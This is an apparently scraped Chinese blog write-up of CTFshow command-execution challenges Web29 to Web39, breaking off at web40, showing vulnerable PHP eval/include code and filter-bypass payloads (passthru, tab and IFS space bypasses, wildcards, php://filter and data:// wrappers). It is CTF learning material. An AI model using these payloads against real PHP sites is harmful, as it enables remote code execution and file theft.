{"blogid": "124363638", "writerAge": "码龄1年", "writerBlogNum": "20", "writerCollect": "8", "writerComment": "0", "writerFan": "18", "writerGrade": "2级", "writerIntegral": "257", "writerName": "枫糖丶", "writerProfileAdress": "writer_image\\profile_124363638.jpg", "writerRankTotal": "57036", "writerRankWeekly": "282538", "writerThumb": "57", "writerVisitNum": "33475", "blog_read_count": "3016", "blog_time": "已于 2022-05-02 00:34:42 修改", "blog_title": "CTFshow——命令执行", "content": "<div class=\"article_content clearfix\" id=\"article_content\">\n<link href=\"style.css\" rel=\"stylesheet\"/>\n<div class=\"markdown_views prism-atom-one-dark\" id=\"content_views\">\n<svg style=\"display: none;\" xmlns=\"http://www.w3.org/2000/svg\">\n<path d=\"M5,0 0,2.5 5,5z\" id=\"raphael-marker-block\" stroke-linecap=\"round\" style=\"-webkit-tap-highlight-color: rgba(0, 0, 0, 0);\"></path>\n</svg>\n<h1><a id=\"CTFshow_0\"></a>CTFshow——命令执行</h1>\n<h2><a id=\"Web29_2\"></a>Web29</h2>\n<pre><code class=\"prism language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{<!-- --></span>\n    <span class=\"token variable\">$c</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/flag/i\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$c</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{<!-- --></span>\n        <span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$c</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n    \n<span class=\"token punctuation\">}</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">{<!-- --></span>\n    <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n</code></pre>\n<p>可以看到，flag已经被过滤掉，先查看目录</p>\n<p><img alt=\"\" src=\"image\\38e91e20d70b4dcfa110c9e9e703d7b6.png\"/></p>\n<p>我们可以使用通配符绕过flag的过滤<br/> <img alt=\"在这里插入图片描述\" src=\"image\\67934135670142c0af7549a5bcd3103d.png\"/></p>\n<h2><a id=\"Web30_30\"></a>Web30</h2>\n<pre><code class=\"prism language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{<!-- --></span>\n    <span class=\"token variable\">$c</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/flag|system|php/i\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$c</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{<!-- --></span>\n        <span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$c</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>   \n<span class=\"token punctuation\">}</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">{<!-- --></span>\n    <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span> \n</code></pre>\n<p>这次除了flag同时还过滤了system函数和php</p>\n<p>虽然system函数被过滤，但是在php中有三个专门执行外部命令的函数system()，exec()，passthru()，换一个函数进行查看目录，使用通配符即可</p>\n<p>（记得将把php也换上通配符）</p>\n<p><img alt=\"在这里插入图片描述\" src=\"image\\e3ab09d9c7864dc6aa82373ac2bd96a3.png\"/></p>\n<h2><a id=\"Web31_56\"></a>Web31</h2>\n<pre><code class=\"prism language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{<!-- --></span>\n    <span class=\"token variable\">$c</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/flag|system|php|cat|sort|shell|\\.| |\\'/i\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$c</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{<!-- --></span>\n        <span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$c</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">{<!-- --></span>\n    <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span> \n</code></pre>\n<p>查看源码，被禁用掉的关键词有<code>flag，system，php，cat，sort，shell，点号、空格、单引号</code>等</p>\n<p>发现之前所使用的passthru()函数并不影响。所以使用passthru()函数进行尝试，发现可以使用</p>\n<pre><code class=\"prism language-php\"><span class=\"token operator\">?</span>c<span class=\"token operator\">=</span><span class=\"token function\">passthru</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"ls\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token operator\">?</span>c<span class=\"token operator\">=</span><span class=\"token function\">passthru</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"nl%20`ls`\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//不可行原因是因为%20经过url解码之后的结果是空格，而空格已经被过滤掉了</span>\n<span class=\"token operator\">?</span>c<span class=\"token operator\">=</span><span class=\"token function\">passthru</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"nl%09`ls`\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//解决方法就是将空格用其他组字符替换掉</span>\n</code></pre>\n<p>除此之外，</p>\n<p>绕过cat使用<code>tac more less head tac tail nl od(二进制查看) vi vim sort uniq</code></p>\n<p>绕过空格用<code>%09 &lt;&gt; ${IFS} $IFS$9 {cat,fl*} %20</code></p>\n<p>flag绕过可以用通符代替<br/> <img alt=\"在这里插入图片描述\" src=\"image\\5a54f750642a43ec9c67ebef666b67d0.png\"/></p>\n<h2><a id=\"Web32_94\"></a>Web32</h2>\n<pre><code class=\"prism language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{<!-- --></span>\n    <span class=\"token variable\">$c</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/flag|system|php|cat|sort|shell|\\.| |\\'|\\`|echo|\\;|\\(/i\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$c</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{<!-- --></span>\n        <span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$c</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">{<!-- --></span>\n    <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span> \n</code></pre>\n<p>可以看到flag，system，php，cat，sort，shell，点号、空格、单引号，echo，分号，左括号都被过滤掉了</p>\n<p>经过查找资料我发现在php中存在一个独有的一个协议php://filter，可以作为一个中间流来处理其他流，可以进行任意文件的读取；根据名字filter（过滤器），可以很容易想到这个协议可以用来过滤一些东西。通过查找，这个函数可以使用多个参数达到不同的目的</p>\n<table><thead><tr><th>名称</th><th>描述</th><th>备注</th></tr></thead><tbody><tr><td>resource=&lt;要过滤的数据流&gt;</td><td>指定了你要筛选过滤的数据流。</td><td>必选</td></tr><tr><td>read=&lt;读链的筛选列表&gt;</td><td>可以设定一个或多个过滤器名称，以管道符（）分隔。</td><td>可选</td></tr><tr><td>write=&lt;写链的筛选列表&gt;</td><td>可以设定一个或多个过滤器名称，以管道符（）分隔。</td><td>可选</td></tr><tr><td>&lt;；两个链的筛选列表&gt;</td><td>任何没有以 read= 或 write= 作前缀 的筛选器列表会视情况应用于读或写链。</td><td></td></tr></tbody></table>\n<p>同时read和write还可以对代码进行加密和解密操作</p>\n<pre><code class=\"prism language-php\"><span class=\"token operator\">?</span>c<span class=\"token operator\">=</span><span class=\"token keyword\">include</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"url\"</span><span class=\"token punctuation\">]</span><span class=\"token operator\">?</span><span class=\"token operator\">&gt;</span><span class=\"token operator\">&amp;</span>url<span class=\"token operator\">=</span>php<span class=\"token punctuation\">:</span><span class=\"token comment\">//filter/read=convert.base64-encode/resource=flag.php</span>\n</code></pre>\n<p>先使用?&gt;闭合代码，然后使用php://filter协议将目标文件进行base64编码，之后直接读取目标文件<br/> <img alt=\"在这里插入图片描述\" src=\"image\\6981e68225334e8ba82e7cde5f945293.png\"/><br/> 将得到的密码进行base64解码即可得到正确答案<br/> <img alt=\"在这里插入图片描述\" src=\"image\\cbd6c5bd0342460795f96e69defca38c.png\"/></p>\n<h2><a id=\"Web33_135\"></a>Web33</h2>\n<pre><code class=\"prism language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{<!-- --></span>\n    <span class=\"token variable\">$c</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/flag|system|php|cat|sort|shell|\\.| |\\'|\\`|echo|\\;|\\(|\\\"/i\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$c</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{<!-- --></span>\n        <span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$c</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">{<!-- --></span>\n    <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span> \n</code></pre>\n<p>双引号也被过滤掉了</p>\n<p>我们将上一题的变量名改为其他类型不使用双引号即可</p>\n<pre><code class=\"prism language-php\"><span class=\"token operator\">?</span>c<span class=\"token operator\">=</span><span class=\"token keyword\">include</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token operator\">?</span><span class=\"token operator\">&gt;</span><span class=\"token operator\">&amp;</span><span class=\"token number\">1</span><span class=\"token operator\">=</span>php<span class=\"token punctuation\">:</span><span class=\"token comment\">//filter/read=convert.base64-encode/resource=flag.php</span>\n</code></pre>\n<p>之后再进行base64解码即可</p>\n<p><img alt=\"在这里插入图片描述\" src=\"image\\75e34a294ebe4ee68caf4df3ad49012e.png\"/></p>\n<h2><a id=\"Web34_166\"></a>Web34</h2>\n<pre><code class=\"prism language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{<!-- --></span>\n    <span class=\"token variable\">$c</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/flag|system|php|cat|sort|shell|\\.| |\\'|\\`|echo|\\;|\\(|\\:|\\\"/i\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$c</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{<!-- --></span>\n        <span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$c</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">{<!-- --></span>\n    <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span> \n</code></pre>\n<p>冒号也被过滤了，由于上一题payload中只有php://filter协议里出现过冒号，所以不影响使用</p>\n<h2><a id=\"Web35_187\"></a>Web35</h2>\n<pre><code class=\"prism language-php\"> <span class=\"token operator\">&lt;</span><span class=\"token operator\">?</span>php\n<span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{<!-- --></span>\n    <span class=\"token variable\">$c</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/flag|system|php|cat|sort|shell|\\.| |\\'|\\`|echo|\\;|\\(|\\:|\\\"|\\&lt;|\\=/i\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$c</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{<!-- --></span>\n        <span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$c</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">{<!-- --></span>\n    <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span> \n</code></pre>\n<p>过滤新增了尖括号，继续使用php://filter协议同上</p>\n<h2><a id=\"Web36_206\"></a>Web36</h2>\n<pre><code class=\"prism language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{<!-- --></span>\n    <span class=\"token variable\">$c</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/flag|system|php|cat|sort|shell|\\.| |\\'|\\`|echo|\\;|\\(|\\:|\\\"|\\&lt;|\\=|\\/|[0-9]/i\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$c</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{<!-- --></span>\n        <span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$c</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">{<!-- --></span>\n    <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span> \n</code></pre>\n<p>等号与数字被过滤，我们将原来的数字再替换成字符即可</p>\n<pre><code class=\"prism language-php\"><span class=\"token operator\">?</span>c<span class=\"token operator\">=</span><span class=\"token keyword\">include</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span>a<span class=\"token punctuation\">]</span><span class=\"token operator\">?</span><span class=\"token operator\">&gt;</span><span class=\"token operator\">&amp;</span>a<span class=\"token operator\">=</span>php<span class=\"token punctuation\">:</span><span class=\"token comment\">//filter/read=convert.base64-encode/resource=flag.php</span>\n</code></pre>\n<h2><a id=\"Web37_231\"></a>Web37</h2>\n<pre><code class=\"prism language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token comment\">//flag in flag.php</span>\n<span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{<!-- --></span>\n    <span class=\"token variable\">$c</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/flag/i\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$c</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{<!-- --></span>\n        <span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$c</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">echo</span> <span class=\"token variable\">$flag</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>    \n<span class=\"token punctuation\">}</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">{<!-- --></span>\n    <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span> \n</code></pre>\n<p>查看代码发现过滤了flag，还使用了include文件包含</p>\n<h3><a id=\"PHP_250\"></a>文件包含：PHP伪协议</h3>\n<p>实际上这几道题考查的属于文件包含的范畴，是考察PHP伪协议</p>\n<p>PHP伪协议就是PHP 提供了一些杂项输入/输出（IO）流，允许访问 PHP 的输入输出流、标准输入输出和错误描述符， 内存中、磁盘备份的临时文件流以及可以操作其他读取写入文件资源的过滤器。</p>\n<p><strong>data://</strong> 同样类似与php://input，可以让用户来控制输入流，当它与包含函数结合时，用户输入的data://流会被当作php文件执行。从而导致任意代码执行。<br/> ————————————————<br/> 可以参考CSDN博主「LetheSec」的文章：https://blog.csdn.net/qq_42181428/article/details/87090539</p>\n<p>所以本题可以使用data://协议</p>\n<pre><code class=\"prism language-php\"><span class=\"token operator\">?</span>c<span class=\"token operator\">=</span>data<span class=\"token punctuation\">:</span><span class=\"token comment\">//text/plain,&lt;?php system(\"tac f*\");</span>\n</code></pre>\n<h2><a id=\"Web38_270\"></a>Web38</h2>\n<pre><code class=\"prism language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n\n<span class=\"token comment\">//flag in flag.php</span>\n<span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{<!-- --></span>\n    <span class=\"token variable\">$c</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/flag|php|file/i\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$c</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{<!-- --></span>\n        <span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$c</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">echo</span> <span class=\"token variable\">$flag</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">{<!-- --></span>\n    <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span> \n</code></pre>\n<p>还是文件包含，但多过滤了php，可以利用base64编码绕过</p>\n<p><img alt=\"在这里插入图片描述\" src=\"image\\9e64b557de18438d84c295e69518abe4.png\"/></p>\n<pre><code class=\"prism language-php\"><span class=\"token operator\">?</span>c<span class=\"token operator\">=</span>data<span class=\"token punctuation\">:</span><span class=\"token comment\">//text/plain;base64,PD9waHAgc3lzdGVtKCJjYXQgZioiKTs=</span>\n</code></pre>\n<p>之后查看源码即可</p>\n<h2><a id=\"Web39_301\"></a>Web39</h2>\n<pre><code class=\"prism language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token comment\">//flag in flag.php</span>\n<span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{<!-- --></span>\n    <span class=\"token variable\">$c</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/flag/i\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$c</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{<!-- --></span>\n        <span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$c</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\".php\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>  \n<span class=\"token punctuation\">}</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">{<!-- --></span>\n    <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span> \n</code></pre>\n<p>data://text/plain相当于执行了php语句而.php由于前面的语句已经闭合了，所以后面的.php会被当成html页面直接显示在页面上，就不在起作用了</p>\n<pre><code class=\"prism language-php\"><span class=\"token operator\">?</span>c<span class=\"token operator\">=</span>data<span class=\"token punctuation\">:</span><span class=\"token comment\">//text/plain,&lt;?= system(\"cat fla*\");?&gt;</span>\n</code></pre>\n<h2><a id=\"web40_327\"></a>web40</h2>\n<pre><code class=\"prism language-php\"> <span class=\"token 